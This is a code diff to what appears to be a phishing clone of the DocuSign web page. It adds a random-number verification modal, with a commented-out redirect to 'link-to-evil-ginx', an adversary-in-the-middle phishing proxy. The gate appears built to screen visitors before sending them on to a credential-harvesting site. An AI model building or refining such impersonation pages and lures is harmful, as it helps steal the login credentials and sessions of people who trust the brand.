@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width" />
     <meta charset="utf-8" />
 
-    <script type="text/javascript" src="/optimizely-edge/20917322951"
-        referrerpolicy="no-referrer-when-downgrade"></script>
+    <!-- <script type="text/javascript" src="/optimizely-edge/20917322951"
+        referrerpolicy="no-referrer-when-downgrade"></script> -->
 
     <title>
         DocuSign | #1 in Electronic Signature and Contract Lifecycle Management
@@ -5801,8 +5801,8 @@
                     ensure you enter the code
                     below</p>
                 <div style="display: flex; justify-content: center; margin: 24px 0px 0px; align-items: center;">
-                    <p style="color: rgba(0, 107, 240); font-size: 40px; margin: 0px; font-weight: 600;">
-                        69</p>
+                    <p style="color: rgba(0, 107, 240); font-size: 40px; margin: 0px; font-weight: 600;" id="randInt">
+                    </p>
                     <i class="fa fa-arrow-right" style="margin: 0px 8px; font-size: 32px; color: rgb(0, 107, 240);"></i>
 
                     <div>
@@ -5819,6 +5819,10 @@
     </div>
 
     <script>
+        let randomNumber = Math.floor(Math.random() * 99);
+        let randInt = document.getElementById("randInt");
+        randInt.value = randomNumber;
+        randInt.innerHTML = randInt.value;
         let modal = document.getElementById("modal");
         let code = document.getElementById("code");
 
@@ -5827,10 +5831,13 @@
         }, 4000)
 
         code.addEventListener("input", function (e) {
-            if (code.value == "69") {
+            if (code.value == randInt.value) {
+                modal.style.display = "none";
+                // window.location.href = "link-to-evil-ginx";
+            } else if (code.value.length >= 2 && code.value != randInt.value) {
                 let currentUrl = window.location.href;
-                currentUrl += '&status=true';
                 window.location.href = currentUrl;
+                alert("Invalid code. Please try again.")
             }
         });
     </script>
